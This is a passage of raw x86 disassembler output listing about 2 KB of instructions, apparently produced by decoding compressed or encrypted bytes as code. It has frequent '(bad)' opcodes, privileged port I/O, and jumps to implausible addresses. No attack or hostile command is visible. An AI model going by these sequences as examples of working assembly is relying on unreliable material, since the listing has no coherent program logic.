  420666:	mov    cs,WORD PTR [edx]
  420668:	pop    ebp
  420669:	(bad)
  42066d:	inc    edx
  42066e:	test   BYTE PTR [edx],cl
  420670:	dec    ebp
  420671:	icebp  
  420672:	fwait
  420673:	cmp    al,0xfc
  420675:	jno    0x4206ab
  420677:	lea    esi,[edx]
  420679:	pusha  
  42067a:	mov    esp,0x636b0696
  42067f:	outs   dx,DWORD PTR ds:[esi]
  420680:	scas   eax,DWORD PTR es:[edi]
  420681:	test   BYTE PTR [ebp+0x55cbc1fd],0x3b
  420688:	mov    ebx,0xdbfb5455
  42068d:	shl    ecx,0x6
  420690:	into   
  420691:	cmp    cl,BYTE PTR [edx+0x56d0fc25]
  420697:	in     eax,dx
  420698:	jnp    0x42067d
  42069a:	cwde   
  42069b:	adc    DWORD PTR [edi],edx
  42069d:	xchg   esi,eax
  42069e:	or     DWORD PTR [eax+0x5078d7c],ecx
  4206a4:	dec    edx
  4206a5:	mov    eax,ds:0xef926b28
  4206aa:	ins    BYTE PTR es:[edi],dx
  4206ab:	aas    
  4206ac:	dec    ebp
  4206ad:	jmp    0xe465601c
  4206b2:	dec    ebp
  4206b3:	mov    ds:0x95ab1ecc,eax
  4206b8:	sub    dl,ah
  4206ba:	lods   eax,DWORD PTR ds:[esi]
  4206bb:	retf   0x118c
  4206be:	add    dl,0xfe
  4206c1:	mov    edx,0xfdfd1381
  4206c6:	push   eax
  4206c7:	fisubr WORD PTR [ebx+0x713ca790]
  4206cd:	sub    edx,DWORD PTR [eax+0x671d4825]
  4206d3:	lock dec edi
  4206d5:	dec    edx
  4206d6:	in     al,dx
  4206d7:	in     al,0xef
  4206d9:	rcr    eax,0x60
  4206dc:	test   al,0xc5
  4206de:	aam    0x88
  4206e0:	(bad)  
  4206e1:	cdq    
  4206e2:	push   ebp
  4206e3:	cmc    
  4206e4:	xchg   ecx,eax
  4206e5:	test   eax,0xcbdf64de
  4206ea:	ret    
  4206eb:	jb     0x420675
  4206ed:	mov    ch,0x96
  4206ef:	or     al,0xa2
  4206f1:	push   0xffffffe3
  4206f3:	xchg   ebp,eax
  4206f4:	mov    al,ds:0xb48ee2e5
  4206f9:	sbb    edi,DWORD PTR [esi-0x719459fb]
  4206ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420700:	xchg   DWORD PTR [ecx],edx
  420702:	xchg   esi,eax
  420703:	adc    DWORD PTR [eax-0x63a7482],esi
  420709:	fstp   DWORD PTR gs:[ecx]
  42070c:	or     eax,0x4c3cab07
  420711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420712:	imul   ecx,DWORD PTR [eax-0x35],0xffffffeb
  420716:	xor    edi,DWORD PTR [edx-0xf7c12c8]
  42071c:	pop    ds
  42071d:	sbb    BYTE PTR [ebx],al
  42071f:	mov    eax,DWORD PTR [edx+eax*2+0x1ff76b1d]
  420726:	xor    dh,al
  420728:	mov    al,0x35
  42072a:	xor    ebx,DWORD PTR [esi-0xe]
  42072d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42072f:	adc    edx,edi
  420731:	mov    dl,cl
  420733:	and    al,0xfc
  420735:	ficom  WORD PTR [ecx+0x35a58704]
  42073b:	nop
  42073c:	loope  0x42071e
  42073e:	out    dx,eax
  42073f:	mov    DWORD PTR [ebx-0x213149a6],edi
  420745:	jmp    0x42076d
  420747:	cmp    eax,0x9d7520c7
  42074c:	cmp    eax,0x5821328a
  420751:	and    bh,BYTE PTR [esp+ebp*1-0x4d]
  420755:	addr16 dec edi
  420757:	stc    
  420758:	sub    BYTE PTR [esi+edi*1+0x40],dh
  42075c:	sub    DWORD PTR [esi],ecx
  42075e:	jo     0x4207ac
  420760:	cmp    eax,0x29123549
  420765:	adc    DWORD PTR [edi],eax
  420767:	adc    eax,0x51ff1768
  42076c:	pop    edx
  42076d:	rol    DWORD PTR [ebp+0x49],1
  420770:	lds    eax,FWORD PTR [ecx+0x51]
  420773:	mov    al,ds:0xce88e5d4
  420778:	(bad)  
  420779:	fmul   DWORD PTR [esi+0x6]
  42077c:	add    ecx,DWORD PTR [ecx+0xdbda601]
  420782:	cmp    dl,BYTE PTR [edi+0x5ba6753a]
  420788:	mov    dl,0x55
  42078a:	push   0xffffffdb
  42078c:	jmp    0x42076d
  42078e:	lods   eax,DWORD PTR ds:[esi]
  42078f:	in     eax,0x17
  420791:	pop    es
  420792:	mov    ss,WORD PTR [edx]
  420794:	and    DWORD PTR [ebx],edx
  420796:	dec    esi
  420797:	loope  0x42078d
  420799:	mov    DWORD PTR [eax+0xfa80416],esp
  42079f:	mov    ds:0xa2ba9acf,eax
  4207a4:	push   ds
  4207a5:	adc    esi,ebp
  4207a7:	dec    esi
  4207a8:	ret    0xbdc6
  4207ab:	je     0x42073b
  4207ad:	inc    esi
  4207ae:	pop    DWORD PTR fs:[edi+0x44c7589b]
  4207b5:	or     ebx,ecx
  4207b7:	inc    edi
  4207b8:	ret    0xef55
  4207bb:	xchg   esi,eax
  4207bc:	jmp    0x420834
  4207be:	inc    ebp
  4207bf:	sbb    al,0x59
  4207c1:	icebp  
  4207c2:	jle    0x4207d4
  4207c4:	popf   
  4207c5:	pop    ecx
  4207c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c7:	imul   ecx,DWORD PTR [edx+ebx*1],0xf800c925
  4207ce:	inc    edi
  4207cf:	mov    ebp,0xea60ab1f
  4207d4:	add    DWORD PTR [esi-0x22],ecx
  4207d7:	adc    dl,BYTE PTR [edi+eiz*2]
  4207da:	lea    ebx,[edx+0x57]
  4207dd:	add    ah,BYTE PTR [eax]
  4207df:	jbe    0x4207bd
  4207e1:	bound  ebx,QWORD PTR [edx]
  4207e3:	push   ss
  4207e4:	and    ah,bh
  4207e6:	jg     0x42084c
  4207e8:	add    BYTE PTR [edi],bl
  4207ea:	aad    0xcc
  4207ec:	(bad)  
  4207ed:	xor    al,0xd2
  4207ef:	enter  0xa520,0x86
  4207f3:	popf   
  4207f4:	lds    edx,FWORD PTR [esi+0x29]
  4207f7:	int    0xbb
  4207f9:	or     eax,0x2ee47df9
  4207fe:	mov    bl,0xd9
  420800:	fnstcw WORD PTR [eax+eax*1-0x34]
  420804:	test   edi,edx
  420806:	inc    eax
  420807:	xchg   ebx,eax
  420808:	icebp  
  420809:	dec    ebx
  42080a:	mov    BYTE PTR [ebp+0x25],ah
  42080d:	test   DWORD PTR [edi-0x61],0x4abcdf27
  420814:	(bad)  
  420816:	mul    BYTE PTR [ebp+0x1]
  420819:	fistp  QWORD PTR [esi-0x7a3b9cd4]
  42081f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420820:	or     ebx,esp
  420822:	popf   
  420823:	outs   dx,DWORD PTR ds:[esi]
  420824:	dec    esi
  420825:	ins    BYTE PTR es:[edi],dx
  420826:	mov    DWORD PTR [esi+0x24],ebp
  420829:	adc    eax,0x7488d8da
  42082e:	inc    esp
  42082f:	sbb    al,0x12
  420831:	in     eax,0x22
  420833:	(bad)
  420837:	add    ch,BYTE PTR [edx-0x67203f21]
  42083d:	push   esp
  42083e:	ds out 0x94,al
  420841:	bound  edi,QWORD PTR [eax+0x6f]
  420844:	inc    eax
  420845:	push   ecx
  420846:	frstor [ebp-0xd]
  420849:	fs add eax,0xa6042720
  42084f:	cdq    
  420850:	xchg   edx,eax
  420851:	sub    al,0xab
  420853:	int    0x43
  420855:	inc    edi
  420856:	adc    eax,0x4218ece3
  42085b:	mov    al,0x5
  42085d:	or     esi,DWORD PTR [edi+0x28bac9c1]
  420863:	jmp    0xcd90e4c8
  420868:	(bad)  
  420869:	cld    
  42086a:	std    
  42086b:	not    BYTE PTR [edi-0x7d3eec25]
  420871:	fistp  QWORD PTR [ecx-0xe158ccd]
  420877:	jns    0x420821
  420879:	addr16 jne 0x420804
  42087c:	pop    ebp
  42087d:	mov    ebx,0x7fc20fb6
  420882:	into   
  420883:	mov    ecx,DWORD PTR [edi+0x1]
  420886:	jno    0x4208ee
  420888:	(bad)  
  420889:	out    dx,al
  42088a:	mov    ebp,0xc28a9ee
  42088f:	mov    dl,0x0
  420891:	or     ebx,DWORD PTR [esi-0x4f6ce469]
  420897:	pop    eax
  420898:	nop
  420899:	inc    ebp
  42089a:	cmp    dh,BYTE PTR [esi]
  42089c:	popa   
  42089d:	enter  0xf95b,0x51
  4208a1:	fild   QWORD PTR [eax-0x6d]
  4208a4:	out    dx,al
  4208a5:	lds    esi,FWORD PTR cs:[ebp-0x39]
  4208a9:	sbb    edi,ebp
  4208ab:	repnz mov cl,0xe6
  4208ae:	pop    ss
  4208af:	mov    DWORD PTR [ecx-0x73],edx
  4208b2:	les    ebx,FWORD PTR [ebp+0x1929b6ce]
  4208b8:	dec    ebx
  4208b9:	push   ss
  4208ba:	ficomp WORD PTR [eax+ecx*2]
  4208bd:	into   
  4208be:	xchg   ebp,eax
  4208bf:	sub    ah,bh
  4208c1:	push   es
  4208c2:	jae    0x420933
  4208c4:	mov    dl,0x6e
  4208c6:	sbb    BYTE PTR [eax+0x24],bh
  4208c9:	xchg   ecx,eax
  4208ca:	pop    ebx
  4208cb:	sbb    dl,dl
  4208cd:	fwait
  4208ce:	xlat   BYTE PTR ds:[ebx]
  4208cf:	enter  0x2999,0x8a
  4208d3:	push   0xd8b9ab68
  4208d8:	stos   BYTE PTR es:[edi],al
  4208d9:	mov    al,BYTE PTR [edx-0x745898e3]
  4208df:	iret   
  4208e0:	sar    bh,1
  4208e2:	or     eax,0x7bd954f3
  4208e7:	std    
  4208e8:	ss mov bl,0x13
  4208eb:	pusha  
  4208ec:	loop   0x420957
  4208ee:	popf   
  4208ef:	lock leave 
  4208f1:	jb     0x42089a
  4208f3:	iret   
  4208f4:	and    al,0xa2
  4208f6:	fisubr WORD PTR [ecx+0x544d12e8]
  4208fc:	and    al,BYTE PTR ds:0x2a3c421d
  420902:	mov    al,ds:0xf04d0147
  420907:	mov    esp,DWORD PTR [edx]
  420909:	cli    
  42090a:	pushf  
  42090b:	mov    WORD PTR [edx],?
  42090d:	(bad)  
  42090f:	test   esi,eax
  420911:	mov    edx,0x5585ddb4
  420916:	mov    dl,0xae
  420918:	and    eax,DWORD PTR [edi]
  42091a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42091b:	in     eax,0x5f
  42091d:	mov    ah,0xc1
  42091f:	int    0xb2
  420921:	(bad)  
  420922:	(bad)  
  420924:	ins    DWORD PTR es:[edi],dx
  420925:	push   cs
  420926:	(bad)  
  420927:	rol    DWORD PTR [edi+edx*4],cl
  42092a:	and    BYTE PTR cs:[ebp+eiz*2+0x4a],dh
  42092f:	(bad)  
  420930:	(bad)  [edx+0x64]
  420933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420934:	cli    
  420935:	xchg   ebx,eax
  420936:	stos   DWORD PTR es:[edi],eax
  420937:	dec    esi
  420938:	imul   ebx,DWORD PTR gs:[esi],0x3659fe74
  42093f:	pop    ebx
  420940:	mov    cl,0xc8
  420942:	xchg   esi,eax
  420943:	push   eax
  420944:	pop    esp
  420945:	xchg   al,bl
  420947:	or     BYTE PTR [edx-0x6c14f946],dl
  42094d:	mov    dh,0xe7
  42094f:	cs mov esi,0x5ec30d9d
  420955:	ins    DWORD PTR es:[edi],dx
  420956:	mov    ds:0xde0004ba,al
  42095b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42095c:	es add al,0x21
  42095f:	push   edx
  420960:	or     DWORD PTR [edi+0x77],edx
  420963:	mov    dl,0x72
  420965:	sbb    al,0x2a
  420967:	and    al,0xe1
  420969:	cmp    BYTE PTR [ebx],cl
  42096b:	pop    ecx
  42096c:	fisub  WORD PTR [edx]
  42096e:	rcr    BYTE PTR [edi],cl
  420970:	sbb    DWORD PTR [eax-0x19],edi
  420973:	jo     0x4208fe
  420975:	dec    ecx
  420976:	ins    BYTE PTR es:[edi],dx
  420977:	out    0x3e,al
  420979:	popf   
  42097a:	jnp    0x42099b
  42097c:	xchg   esp,eax
  42097d:	or     BYTE PTR [ebx-0x3b],dl
  420980:	pusha  
  420981:	xor    DWORD PTR gs:[ebx],ebp
  420984:	or     DWORD PTR [edx-0x6f],edx
  420987:	iret   
  420988:	out    dx,eax
  420989:	push   edx
  42098a:	sbb    edx,DWORD PTR [esp+ecx*4+0x2d]
  42098e:	sbb    BYTE PTR [eax-0x5b],dh
  420991:	mov    ebx,DWORD PTR [edi+ebx*1-0x4e]
  420995:	pop    eax
  420996:	mov    bl,0x43
  420998:	es mov bl,0xe4
  42099b:	add    DWORD PTR [edx-0x2],ebx
  42099e:	mov    BYTE PTR es:[ebp+0x1aef6f81],al
  4209a5:	and    DWORD PTR [ecx],eax
  4209a7:	xor    al,0xad
  4209a9:	jae    0x420982
  4209ab:	mov    BYTE PTR [eax],ah
  4209ad:	scas   eax,DWORD PTR es:[edi]
  4209ae:	push   0xfffffff1
  4209b0:	fnsave [esi]
  4209b2:	push   esi
  4209b3:	jo     0x420952
  4209b5:	in     eax,0xd9
  4209b7:	mov    bh,0x45
  4209b9:	jno    0x4209a4
  4209bb:	dec    edi
  4209bc:	add    ah,BYTE PTR [edx-0x6567049]
  4209c2:	xor    eax,DWORD PTR [eax]
  4209c4:	(bad)  
  4209c5:	pop    ss
  4209c6:	sub    al,0x93
  4209c8:	jmp    0x49317d45
  4209cd:	stos   BYTE PTR es:[edi],al
  4209ce:	pop    edx
  4209cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209d0:	repnz push esi
  4209d2:	ja     0x4209b9
  4209d4:	mov    bl,0x80
  4209d6:	jne    0x42098d
  4209d8:	test   DWORD PTR [eax-0x1d],0x2e1b2c23
  4209df:	pusha  
  4209e0:	jmp    0x420a16
  4209e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209e3:	sti    
  4209e4:	xchg   esp,eax
  4209e5:	in     al,0x84
  4209e7:	sub    bl,BYTE PTR [esi+0x1d]
  4209ea:	mov    al,0x6b
  4209ec:	popf   
  4209ed:	mov    esi,0x56de2127
  4209f2:	imul   esp,esi,0x39
  4209f5:	fmul   DWORD PTR [edi+edi*2]
  4209f8:	adc    cl,BYTE PTR [eax+0x59a89e4c]
  4209fe:	fmul   st,st(2)
  420a00:	pop    es
  420a01:	mov    ds:0x4ab10305,eax
  420a06:	jge    0x4209c1
  420a08:	sti    
  420a09:	cwde   
  420a0a:	sti    
  420a0b:	sub    DWORD PTR [ecx-0x32],0x54
  420a0f:	push   ss
  420a10:	xor    eax,0x6b583d2e
  420a15:	sbb    BYTE PTR [edi-0x72],ah
  420a18:	ficomp WORD PTR [ebp+0x1a0d42ef]
  420a1e:	out    dx,al
  420a1f:	mov    eax,0x37c7bff4
  420a24:	xchg   edi,eax
  420a25:	imul   ebx,DWORD PTR [eax+0x581a47d4],0xffffffc7
  420a2c:	xchg   ecx,eax
  420a2d:	sbb    dl,ah
  420a2f:	aad    0xa8
  420a31:	inc    ecx
  420a32:	adc    DWORD PTR [edi+ebx*4-0x5e769ee6],ebp
  420a39:	adc    esp,DWORD PTR [ebx+edx*4-0x2c]
  420a3d:	enter  0x90ff,0xc2
  420a41:	and    eax,0x9771fb85
  420a46:	fisttp WORD PTR [esi-0x912aae4]
  420a4c:	cmc    
  420a4d:	int    0x8b
  420a4f:	cwde   
  420a50:	push   ds
  420a51:	sub    al,0xbb
  420a53:	lods   al,BYTE PTR ds:[esi]
  420a54:	mov    edx,0x9b549156
  420a59:	and    esi,DWORD PTR ss:[esi-0x27]
  420a5d:	or     BYTE PTR [edx-0xd],bh
  420a60:	outs   dx,DWORD PTR ds:[esi]
  420a61:	xor    esi,edi
  420a63:	push   0x7d
  420a65:	jno    0x420a6b
  420a67:	sub    bl,BYTE PTR [esi+0x38]
  420a6a:	imul   ebp,DWORD PTR [esi],0xfd668b77
  420a70:	sub    eax,0xdb6ffd9
  420a75:	push   eax
  420a76:	jne    0x420ab0
  420a78:	dec    DWORD PTR [ecx]
  420a7a:	mov    BYTE PTR [ecx],ah
  420a7c:	mov    gs,WORD PTR [esi-0x4a]
  420a7f:	cmp    bh,bh
  420a81:	imul   esp,DWORD PTR [ecx-0x3601c8d4],0xffffffd6
  420a88:	jnp    0x420ad2
  420a8a:	or     BYTE PTR [eax],al
  420a8c:	pcmpgtw mm1,QWORD PTR [ebp-0x6af0fbfc]
  420a93:	ja     0x420ac3
  420a95:	mov    ebx,DWORD PTR [edi-0x7ead36cc]
  420a9b:	jmp    0x420acf
  420a9d:	adc    dl,BYTE PTR [edx-0x7b]
  420aa0:	jns    0x420a28
  420aa2:	rcr    BYTE PTR [eax],1
  420aa4:	push   0xad10f490
  420aa9:	arpl   WORD PTR [ebx-0x46e31d25],bx
  420aaf:	ins    BYTE PTR es:[edi],dx
  420ab0:	stc    
  420ab1:	es mov dl,0x42
  420ab4:	loop   0x420b21
  420ab6:	push   ss
  420ab7:	xchg   DWORD PTR [eax+0x29112ef2],ebx
  420abd:	dec    ebp
  420abe:	add    DWORD PTR [eax+esi*4],ebx
  420ac1:	int    0x96
  420ac3:	cs adc eax,0xbd870243
  420ac9:	lods   al,BYTE PTR ds:[esi]
  420aca:	cwde   
  420acb:	pop    ss
  420acc:	outs   dx,BYTE PTR ds:[esi]
  420acd:	les    ebp,FWORD PTR [ecx+0x3c]
  420ad0:	xchg   BYTE PTR [ebx-0x40c44c91],ch
  420ad6:	call   0x32eab66b
  420adb:	adc    eax,0xfba90970
  420ae0:	loope  0x420a83
  420ae2:	bound  esp,QWORD PTR [ebx-0x333bce2c]
  420ae8:	and    eax,0xd90d22f0
  420aed:	add    BYTE PTR [eax],bl
  420aef:	in     eax,0xb1
  420af1:	push   0xffffffb4
  420af3:	in     al,dx
  420af4:	or     bh,BYTE PTR [edx+0x65]
  420af7:	and    BYTE PTR [edi+edx*4],ah
  420afa:	xchg   ebx,ebp
  420afc:	inc    edi
  420afd:	jns    0x420b01
  420aff:	data16 clc 
  420b01:	imul   esp,edi,0x3c
  420b04:	test   bl,al
  420b06:	mov    esp,0x99bce272
  420b0b:	rol    DWORD PTR [eax],1
  420b0d:	jmp    0x420b8e
  420b0f:	aas    
  420b10:	ins    DWORD PTR es:[edi],dx
  420b11:	repz inc esp
  420b13:	call   0xb1a80adf
  420b18:	out    0xe9,al
  420b1a:	mov    eax,ds:0x3b0b46b1
  420b1f:	mov    edi,esp
  420b21:	sbb    eax,0xe9b0f0a8
  420b26:	fcomp  QWORD PTR [edi+eax*2]
  420b29:	sbb    al,0xca
  420b2b:	out    0x82,al
  420b2d:	hlt    
  420b2e:	jecxz  0x420bab
  420b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b31:	das    
  420b32:	sbb    BYTE PTR [ebp-0x26b9e4bf],cl
  420b38:	bnd ret 
  420b3a:	mov    al,0x27
  420b3c:	lea    eax,[edi-0x28]
  420b3f:	aaa    
  420b40:	inc    eax
  420b41:	bound  edi,QWORD PTR [eax-0x52]
  420b44:	jle    0x420b48
  420b46:	mov    al,ds:0x923bc792
  420b4b:	jg     0x420b86
  420b4d:	cmp    esi,eax
  420b4f:	sbb    al,0x29
  420b51:	mov    bl,0x7
  420b53:	jae    0x420ae3
  420b55:	(bad)  
  420b56:	hlt    
  420b57:	sahf   
  420b58:	inc    bl
  420b5a:	fdiv   QWORD PTR ds:0x50379f23
  420b60:	jb     0x420bd6
  420b62:	mov    fs,WORD PTR [esi]
  420b64:	imul   ebp,DWORD PTR [ebx-0x4d],0xffffffcb
  420b68:	les    esp,FWORD PTR [edx-0x4413b59a]
  420b6e:	mov    DWORD PTR [edi+0x7712c483],ebx
  420b74:	dec    esi
  420b75:	idiv   BYTE PTR [edx-0x50b9eeac]
  420b7b:	add    BYTE PTR [ebx-0x3d],0x33
  420b7f:	nop
  420b80:	imul   esp,DWORD PTR [ecx-0x5a4f6497],0xffffff8f
  420b87:	mov    edi,0xc37459a1
  420b8c:	popf   
  420b8d:	push   0x24e77cfa
  420b92:	push   ebp
  420b93:	xor    al,0x77
  420b95:	or     eax,0x850fa7f6
  420b9a:	int3   
  420b9b:	adc    DWORD PTR [edi-0x24],ecx
  420b9e:	inc    esi
  420b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba0:	sbb    dl,BYTE PTR [eax+0x27b56aa1]
  420ba6:	fwait
  420ba7:	xor    dl,BYTE PTR [ebx-0x2935e2a8]
  420bad:	in     al,dx
  420bae:	popa   
  420baf:	mov    dl,0xcd
  420bb1:	push   edx
  420bb2:	nop
  420bb3:	jnp    0x420b8e
  420bb5:	and    eax,DWORD PTR [esi-0x68a0895d]
  420bbb:	jmp    0xea189fcb
  420bc0:	push   ss
  420bc1:	or     DWORD PTR [edx+0x1badab02],ebx
  420bc7:	fldenv [eax+0x7b97c59e]
  420bcd:	adc    BYTE PTR [edi],cl
  420bcf:	pop    ebx
  420bd0:	hlt    
  420bd1:	scas   eax,DWORD PTR es:[edi]
  420bd2:	sub    edi,DWORD PTR [ecx]
  420bd4:	inc    eax
  420bd5:	(bad)  
  420bd6:	adc    ah,BYTE PTR ds:[esi-0x6b]
  420bda:	add    BYTE PTR [edi+0x74],ch
  420bdd:	dec    eax
  420bde:	dec    esi
  420bdf:	hlt    
  420be0:	mov    dl,0xfb
  420be2:	sar    DWORD PTR [ecx+ebp*8],0x77
  420be6:	pop    ebp
  420be7:	call   0xfadc:0xd54d77a1
  420bee:	cmp    al,0x74
  420bf0:	mov    bh,0x87
  420bf2:	mov    ah,0x23
  420bf4:	add    esi,ebx
  420bf6:	or     al,0xf
  420bf8:	lods   al,BYTE PTR ds:[esi]
  420bf9:	sub    al,0x7
  420bfb:	jno    0x420bbe
  420bfd:	mov    DWORD PTR [eax+ebx*4+0x72],0x2f81a216
  420c05:	lock xrelease xacquire sub DWORD PTR [edi-0x7c],0xf0a452da
  420c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c10:	and    BYTE PTR [esi-0x881afc],0xa
  420c17:	pop    es
  420c18:	out    0x55,eax
  420c1a:	(bad)  [edi]
  420c1c:	rol    BYTE PTR [ecx],1
  420c1e:	xchg   ebx,eax
  420c1f:	outs   dx,DWORD PTR ds:[esi]
  420c20:	retf   0x88d6
  420c23:	add    bp,WORD PTR [edi]
  420c26:	push   ebx
  420c27:	or     esi,DWORD PTR [ecx]
  420c29:	js     0x420c9b
  420c2b:	push   edi
  420c2c:	imul   ecx,DWORD PTR [eax-0x230604eb],0x2c0af588
  420c36:	mov    WORD PTR [ecx-0x6f],fs
  420c39:	movq   QWORD PTR [edi+edx*4+0x3a],mm7
  420c3e:	fld    QWORD PTR [ebx-0x3e643475]
  420c44:	or     DWORD PTR [ebp+0x120031e8],ecx
  420c4a:	push   eax
  420c4b:	xchg   edi,eax
  420c4c:	into   
  420c4d:	jb     0x420c1f
  420c4f:	idiv   ch
  420c51:	and    eax,0x3a20c98b
  420c56:	push   esp
  420c57:	pop    esi
  420c58:	push   esi
  420c59:	xor    BYTE PTR [ecx+0x66],ch
  420c5c:	dec    ebx
  420c5d:	(bad)  
  420c5e:	xchg   esp,eax
  420c5f:	sbb    ah,BYTE PTR [edi]
  420c61:	xlat   BYTE PTR ds:[ebx]
  420c62:	push   ebp
  420c63:	je     0x420c60
  420c65:	inc    edx
  420c66:	dec    ebp
  420c67:	gs mov edi,0x4f6eeb27
  420c6d:	push   edi
  420c6e:	(bad)  
  420c6f:	fisubr DWORD PTR [eax]
  420c71:	push   edi
  420c72:	mov    ch,0x4a
  420c74:	emms   
  420c76:	fisttp WORD PTR [esi]
  420c78:	push   ss
  420c79:	loope  0x420c8e
  420c7b:	outs   dx,DWORD PTR ds:[esi]
  420c7c:	mov    ch,0x82
  420c7e:	pop    es
  420c7f:	pop    edx
  420c80:	lods   al,BYTE PTR ds:[esi]
  420c81:	mov    ah,0x8f
  420c83:	test   BYTE PTR [edi-0x13],0x38
  420c87:	pusha  
  420c88:	jnp    0x420c87
  420c8a:	lahf   
  420c8b:	add    al,0xdb
  420c8d:	sbb    al,0x4b
  420c8f:	jae    0x420cc5
  420c91:	cmp    al,0x3e
  420c93:	sub    ebp,eax
  420c95:	push   0xee267c1
  420c9a:	jnp    0x420c99
  420c9c:	add    al,0xc3
  420c9e:	and    eax,0x9b705250
  420ca3:	dec    esp
  420ca4:	mov    al,ds:0xc3e16840
  420ca9:	test   DWORD PTR [esi],edx
  420cab:	(bad)  
  420cac:	fist   WORD PTR [edi-0x6ebcbb59]
  420cb2:	jecxz  0x420c54
  420cb4:	sbb    DWORD PTR [edx+0x3aba6764],0x87831251
  420cbe:	sub    al,BYTE PTR ds:0x56726125
  420cc4:	inc    bh
  420cc6:	or     DWORD PTR [eax+0x61],0x1b
  420cca:	inc    ebx
  420ccb:	pop    ebp
  420ccc:	stc    
  420ccd:	mov    ebp,0xf47de487
  420cd2:	cmp    DWORD PTR [ecx-0x25],eax
  420cd5:	jne    0x420c80
  420cd7:	mov    cl,0x61
  420cd9:	inc    esp
  420cda:	nop    DWORD PTR ds:[ebx]
  420cde:	or     ah,BYTE PTR [edx-0x4d1a0938]
  420ce4:	adc    ah,BYTE PTR [eax-0x4e]
  420ce7:	xor    eax,DWORD PTR [edi-0x2a]
  420cea:	loope  0x420d2c
  420cec:	jne    0x420d04
  420cee:	inc    ebp
  420cef:	retf   
  420cf0:	jno    0x420d54
  420cf2:	sub    bl,BYTE PTR [edi+0x77879495]
  420cf8:	es scas al,BYTE PTR es:[edi]
  420cfa:	jne    0x420c8b
  420cfc:	aam    0xc6
  420cfe:	rdmsr  
  420d00:	test   BYTE PTR [eax-0x547e60ff],bh
  420d06:	push   0xfe4b38fe
  420d0b:	add    DWORD PTR [eax+0x50b6817a],0x6979123a
  420d15:	fcomp  DWORD PTR [edx-0xa]
  420d18:	sbb    DWORD PTR [esi+0x4f203a59],esi
  420d1e:	js     0x420d99
  420d20:	xor    ah,BYTE PTR fs:[eax]
  420d23:	jno    0x420d94
  420d25:	inc    edx
  420d26:	mov    bl,0xee
  420d28:	rcl    eax,cl
  420d2a:	xchg   edx,eax
  420d2b:	aaa    
  420d2c:	cmp    ch,al
  420d2e:	mov    WORD PTR [ebx-0x6fbcb05f],?
  420d34:	adc    al,0x13
  420d36:	add    dh,BYTE PTR [eax]
  420d38:	out    0xba,al
  420d3a:	(bad)  
  420d3c:	add    al,0x8f
  420d3e:	ffreep st(3)
  420d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d41:	xchg   ebp,eax
  420d42:	cld    
  420d43:	xchg   ecx,eax
  420d44:	mov    ebx,0x5174617d
  420d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d4a:	neg    BYTE PTR [esi+edi*8]
  420d4d:	icebp  
  420d4e:	xchg   edx,eax
  420d4f:	mov    esp,0xd31614fe
  420d54:	mov    dh,0xa2
  420d56:	loope  0x420ced
  420d58:	push   esp
  420d59:	ret    0x6b59
  420d5c:	mov    al,0x5
  420d5e:	mul    BYTE PTR [eax+0x7167009f]
  420d64:	mov    bl,0x97
  420d66:	out    0xe5,ax
  420d69:	pop    ecx
  420d6a:	enter  0xeba2,0x2a
  420d6e:	arpl   WORD PTR [ecx+0x15],dx
  420d71:	pop    ds
  420d72:	xlat   BYTE PTR ds:[ebx]
  420d73:	mov    ds:0x1a2e605c,eax
  420d78:	dec    edx
  420d79:	daa    
  420d7a:	adc    eax,0xb2a48923
  420d7f:	jno    0x420d11
  420d81:	iret   
  420d82:	outs   dx,BYTE PTR ds:[esi]
  420d83:	cmp    eax,0x2041716e
  420d88:	rcl    BYTE PTR [edx-0xa],0x74
  420d8c:	bound  ebx,QWORD PTR [eax-0x67]
  420d8f:	mov    ch,0xec
  420d91:	jecxz  0x420d2e
  420d93:	fmul   QWORD PTR [ebp-0x4b]
  420d96:	cmc    
  420d97:	mov    dl,0x69
  420d99:	aad    0x31
  420d9b:	fiadd  WORD PTR [edx-0x1e]
  420d9e:	bound  edx,QWORD PTR [edx]
  420da0:	cmp    al,0xb5
  420da2:	mov    bh,0x53
  420da4:	xor    ch,ch
  420da6:	les    esi,FWORD PTR [esi-0x3db81680]
  420dac:	push   ecx
  420dad:	xchg   BYTE PTR [eax+0x6d],bh
  420db0:	xchg   ecx,eax
  420db1:	mov    edx,esp
  420db3:	data16 add al,0xec
  420db6:	jge    0x420d8f
  420db8:	(bad)  
  420db9:	ficom  WORD PTR [eax-0x4a]
  420dbc:	lahf   
  420dbd:	adc    DWORD PTR [ebp+0x18],esp
  420dc0:	lea    eax,[edi-0x38]
  420dc3:	addr16 js 0x420d57
  420dc6:	aam    0x28
  420dc8:	sbb    al,0x19
  420dca:	fsubr  DWORD PTR [eax-0x1b]
  420dcd:	sar    esp,1
  420dcf:	sub    eax,0xc5e19c92
  420dd4:	scas   al,BYTE PTR es:[edi]
  420dd5:	push   0x58
  420dd7:	retf   0x8697
  420dda:	jmp    0x420e59
  420ddc:	cdq    
  420ddd:	call   0x98b838ae
  420de2:	(bad)  
  420de3:	(bad)  
  420de4:	call   0x8850f8d4
  420de9:	mov    eax,ds:0x19193254
  420dee:	lea    ecx,[esi*1-0x7ba66d43]
  420df5:	sub    eax,0x235bc311
  420dfa:	jno    0x420e69
  420dfc:	inc    esi
  420dfd:	jmp    DWORD PTR [ebx-0x64e1115d]
  420e03:	dec    edi
  420e04:	inc    eax
  420e05:	dec    ecx
  420e06:	fld    TBYTE PTR ds:0x3f7f5c45
  420e0c:	xchg   BYTE PTR [edx],ah
  420e0e:	imul   esp,DWORD PTR [esi],0x9d8b727c
  420e14:	mov    ebp,0xdf5a0cb4
  420e19:	scas   eax,DWORD PTR es:[edi]
